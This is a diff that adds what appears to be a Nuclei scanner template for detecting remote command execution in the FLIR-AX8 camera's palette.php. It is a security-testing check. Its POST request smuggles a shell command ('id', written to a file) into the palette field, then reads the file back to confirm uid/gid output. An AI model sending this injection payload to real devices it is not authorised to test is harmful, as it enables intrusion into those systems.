@@ -1,0 +1,43 @@
+id: flir-ax8-palette-rce
+info:
+  name: FLIR-AX8 palette.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /palette.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        palette=;id>test{{random_number}}.txt;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - "test{{random_number}}.txt"
+  - raw:
+      - |
+        GET /test{{random_number}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=\\d+\\(.*?\\)\\s+gid=\\d+\\(.*?\\)"
+variables:
+  random_number: "{{rand_int(100,999)}}"
